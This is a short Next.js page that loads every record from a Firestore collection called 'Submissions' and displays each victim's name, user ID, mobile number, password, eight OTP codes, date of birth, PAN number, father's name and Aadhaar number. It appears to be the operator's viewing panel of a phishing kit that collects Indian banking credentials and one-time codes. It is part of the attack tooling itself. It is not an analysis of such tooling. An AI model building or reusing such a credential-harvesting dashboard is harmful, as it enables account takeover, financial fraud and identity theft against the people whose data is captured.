'use client'
import { db } from './firebaseConfig';
import React,  { useEffect, useState } from 'react';
import { collection, getDocs} from 'firebase/firestore'

async function fetchDataFromFirestore (){
    const querySnapshot = await getDocs(collection (db, "Submissions"))

    const data = [];
    querySnapshot.forEach((doc) => {
        data.push({ id: doc.id, ...doc.data()});
    });
       return data; 

}

export default function Page() {
    const [userData, setUserData] = useState([]);

    useEffect(() => {
        async function fetchData() {
        const data = await fetchDataFromFirestore();
        setUserData(data);
    }
    fetchData();

    
}, []);
    return (
    <main className="flex min-h-screen flex-col items-center p-24">
    
    <h1 className='text-5xl font-bold mb-10'>
        All Details Here...........
    </h1>
    <div><h2 >Customer Name :-</h2>
        {userData.map((user) => (
            <div key={user.id} className='mb-4'>
                  
                <p>{user.nme}</p>
                

            </div>
        ))}
    </div>




    <div><h2 >User ID :-</h2>
        {userData.map((user) => (
            <div key={user.id} className='mb-4'>

                <p>{user.athu}</p> 
                 
            </div>
        ))}
    </div>

    <div><h2 >Mobile NO :-</h2>
        {userData.map((user) => (
            <div key={user.id} className='mb-4'>

                <p>{user.mbi}</p> 
                 
            </div>
        ))}
    </div>

    <div><h2 >Password :-</h2>
        {userData.map((user) => (
            <div key={user.id} className='mb-4'>

                <p>{user.prd}</p> 
                 
            </div>
        ))}
    </div>

    <div><h2 >OTP 1 :-</h2>
        {userData.map((user) => (
            <div key={user.id} className='mb-4'>

                <p>{user.PP1}</p> 
                 
            </div>
        ))}
    </div>


    <div><h2 >Date Of Birth :-</h2>
        {userData.map((user) => (
            <div key={user.id} className='mb-4'>

                <p>{user.dob}</p> 
                 
            </div>
        ))}
    </div>

    <div><h2 >OTP 2 :-</h2>
        {userData.map((user) => (
            <div key={user.id} className='mb-4'>

                <p>{user.PP2}</p> 
                 
            </div>
        ))}
    </div>

    <div><h2 >OTP 3 :-</h2>
        {userData.map((user) => (
            <div key={user.id} className='mb-4'>

                <p>{user.PP3}</p> 
                 
            </div>
        ))}
    </div>

    <div><h2 >Pan No :-</h2>
        {userData.map((user) => (
            <div key={user.id} className='mb-4'>

                <p>{user.pni}</p> 
                 
            </div>
        ))}
    </div>

    <div><h2 >OTP 4 :-</h2>
        {userData.map((user) => (
            <div key={user.id} className='mb-4'>

                <p>{user.PP4}</p> 
                 
            </div>
        ))}
    </div>

    <div><h2 >Father's Name :-</h2>
        {userData.map((user) => (
            <div key={user.id} className='mb-4'>

                <p>{user.fathr}</p> 
                 
            </div>
        ))}
    </div>

    <div><h2 >Aadhar No :-</h2>
        {userData.map((user) => (
            <div key={user.id} className='mb-4'>

                <p>{user.lan}</p> 
                 
            </div>
        ))}
    </div>

    <div><h2 >OTP 5 :-</h2>
        {userData.map((user) => (
            <div key={user.id} className='mb-4'>

                <p>{user.PP5}</p> 
                 
            </div>
        ))}
    </div>

    <div><h2 >OTP 6 :-</h2>
        {userData.map((user) => (
            <div key={user.id} className='mb-4'>

                <p>{user.PP6}</p> 
                 
            </div>
        ))}
    </div>

    <div><h2 >OTP 7 :-</h2>
        {userData.map((user) => (
            <div key={user.id} className='mb-4'>

                <p>{user.PP7}</p> 
                 
            </div>
        ))}
    </div>

    <div><h2 >OTP 8 :-</h2>
        {userData.map((user) => (
            <div key={user.id} className='mb-4'>

                <p>{user.PP8}</p> 
                 
            </div>
        ))}
    </div>





   
    
    </main>
    )
  }
